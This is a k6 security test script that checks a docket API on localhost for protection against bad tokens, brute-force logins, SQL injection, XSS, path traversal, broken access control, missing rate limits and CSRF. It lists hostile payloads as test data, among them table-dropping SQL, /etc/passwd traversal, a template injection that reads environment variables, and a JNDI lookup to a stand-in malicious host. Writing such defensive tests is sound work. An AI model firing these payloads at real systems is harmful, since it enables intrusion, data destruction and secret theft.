/**
 * Security Testing Script
 * Tests for common vulnerabilities and security issues
 */

import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate } from 'k6/metrics';

const securityViolations = new Rate('security_violations');
const BASE_URL = __ENV.BASE_URL || 'http://localhost:3001';

export const options = {
  stages: [
    { duration: '5m', target: 20 },
  ],
  thresholds: {
    security_violations: ['rate<0.1'], // Less than 10% security violations allowed
    http_req_duration: ['p(95)<3000'],
  },
};

export default function() {
  // Test various security scenarios
  testAuthenticationSecurity();
  testInputValidation();
  testAccessControl();
  testRateLimiting();
  testSQLInjection();
  testXSSPrevention();
  testCSRFProtection();
  
  sleep(1);
}

function testAuthenticationSecurity() {
  // Test with invalid tokens
  const invalidTokens = [
    'invalid-token',
    'Bearer fake-jwt-token',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
    '',
    'null',
    'undefined'
  ];
  
  invalidTokens.forEach(token => {
    const res = http.get(`${BASE_URL}/api/dockets`, {
      headers: { 'Authorization': token },
    });
    
    check(res, {
      'rejects invalid token': (r) => r.status === 401,
    }) || securityViolations.add(1);
  });
  
  // Test password brute force protection
  const bruteForceAttempts = [];
  for (let i = 0; i < 10; i++) {
    bruteForceAttempts.push(['POST', `${BASE_URL}/api/auth/login`, JSON.stringify({
      email: 'admin@example.com',
      password: `wrong-password-${i}`
    }), { headers: { 'Content-Type': 'application/json' } }]);
  }
  
  const responses = http.batch(bruteForceAttempts);
  const lastResponse = responses[responses.length - 1];
  
  check(lastResponse, {
    'brute force protection active': (r) => r.status === 429 || r.status === 423,
  }) || securityViolations.add(1);
}

function testInputValidation() {
  // Test malicious payloads
  const maliciousInputs = [
    '<script>alert("xss")</script>',
    '"; DROP TABLE users; --',
    '../../../etc/passwd',
    '${jndi:ldap://malicious-server.com/evil}',
    '{{7*7}}',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '\'; DELETE FROM audit_logs; --',
    'UNION SELECT password FROM users',
    '../config/database.json'
  ];
  
  // Test search endpoint
  maliciousInputs.forEach(payload => {
    const res = http.get(`${BASE_URL}/api/dockets?search=${encodeURIComponent(payload)}`);
    
    check(res, {
      'input validation prevents malicious search': (r) => {
        return r.status !== 500 && 
               !r.body.includes('error') && 
               !r.body.includes('Exception') &&
               !r.body.includes('Stack trace');
      },
    }) || securityViolations.add(1);
  });
  
  // Test POST endpoints
  const maliciousDocket = {
    title: '<script>alert("xss")</script>',
    description: '"; DROP TABLE dockets; --',
    category: '../../../etc/passwd',
    metadata: {
      malicious: '{{constructor.constructor("return process")().env}}'
    }
  };
  
  const res = http.post(`${BASE_URL}/api/dockets`, JSON.stringify(maliciousDocket), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  check(res, {
    'POST input validation works': (r) => {
      return r.status === 400 || r.status === 401 || 
             (r.status === 422 && r.body.includes('validation'));
    },
  }) || securityViolations.add(1);
}

function testAccessControl() {
  // Test accessing admin endpoints without proper authorization
  const adminEndpoints = [
    '/api/admin/users',
    '/api/admin/system',
    '/api/admin/logs',
    '/api/admin/config',
    '/api/users/1/delete',
    '/api/system/shutdown'
  ];
  
  adminEndpoints.forEach(endpoint => {
    const res = http.get(`${BASE_URL}${endpoint}`);
    
    check(res, {
      [`admin endpoint ${endpoint} protected`]: (r) => r.status === 401 || r.status === 403,
    }) || securityViolations.add(1);
  });
  
  // Test accessing other users' data
  const userDataEndpoints = [
    '/api/users/2/profile',
    '/api/users/2/documents',
    '/api/audit/logs?userId=2'
  ];
  
  userDataEndpoints.forEach(endpoint => {
    const res = http.get(`${BASE_URL}${endpoint}`);
    
    check(res, {
      [`user data endpoint ${endpoint} protected`]: (r) => r.status === 401 || r.status === 403,
    }) || securityViolations.add(1);
  });
}

function testRateLimiting() {
  // Rapid requests to test rate limiting
  const rapidRequests = [];
  for (let i = 0; i < 50; i++) {
    rapidRequests.push(['GET', `${BASE_URL}/api/dockets`, null, {}]);
  }
  
  const responses = http.batch(rapidRequests);
  const rateLimitedResponses = responses.filter(r => r.status === 429);
  
  check(responses[0], {
    'rate limiting active after burst': () => rateLimitedResponses.length > 0,
  }) || securityViolations.add(1);
}

function testSQLInjection() {
  // SQL injection payloads
  const sqlPayloads = [
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; DROP TABLE dockets; --",
    "' OR 1=1 --",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "1' OR '1'='1' ORDER BY 1 --"
  ];
  
  sqlPayloads.forEach(payload => {
    // Test in search parameters
    const res1 = http.get(`${BASE_URL}/api/dockets?search=${encodeURIComponent(payload)}`);
    
    check(res1, {
      [`SQL injection protected in search: ${payload.substring(0, 10)}`]: (r) => {
        return !r.body.includes('SQL') && 
               !r.body.includes('syntax error') &&
               !r.body.includes('mysql') &&
               !r.body.includes('postgresql');
      },
    }) || securityViolations.add(1);
    
    // Test in URL parameters
    const res2 = http.get(`${BASE_URL}/api/dockets/${encodeURIComponent(payload)}`);
    
    check(res2, {
      [`SQL injection protected in URL param: ${payload.substring(0, 10)}`]: (r) => {
        return r.status !== 500 || !r.body.includes('SQL');
      },
    }) || securityViolations.add(1);
  });
}

function testXSSPrevention() {
  // XSS payloads
  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>'
  ];
  
  xssPayloads.forEach(payload => {
    const res = http.get(`${BASE_URL}/api/dockets?search=${encodeURIComponent(payload)}`);
    
    check(res, {
      [`XSS prevention for: ${payload.substring(0, 15)}`]: (r) => {
        // Response should not contain unescaped script tags
        return !r.body.includes('<script>') && 
               !r.body.includes('javascript:') &&
               !r.body.includes('onerror=') &&
               !r.body.includes('onload=');
      },
    }) || securityViolations.add(1);
  });
}

function testCSRFProtection() {
  // Test state-changing operations without CSRF token
  const csrfTests = [
    {
      method: 'POST',
      url: '/api/dockets',
      data: { title: 'CSRF Test' }
    },
    {
      method: 'PUT',
      url: '/api/dockets/1',
      data: { status: 'archived' }
    },
    {
      method: 'DELETE',
      url: '/api/dockets/1'
    }
  ];
  
  csrfTests.forEach(test => {
    const res = http.request(
      test.method,
      `${BASE_URL}${test.url}`,
      JSON.stringify(test.data),
      {
        headers: {
          'Content-Type': 'application/json',
          // Simulate cross-origin request
          'Origin': 'http://malicious-site.com'
        }
      }
    );
    
    check(res, {
      [`CSRF protection for ${test.method} ${test.url}`]: (r) => {
        return r.status === 403 || r.status === 401 || r.status === 400;
      },
    }) || securityViolations.add(1);
  });
}

export function teardown() {
  console.log('Security test completed');
}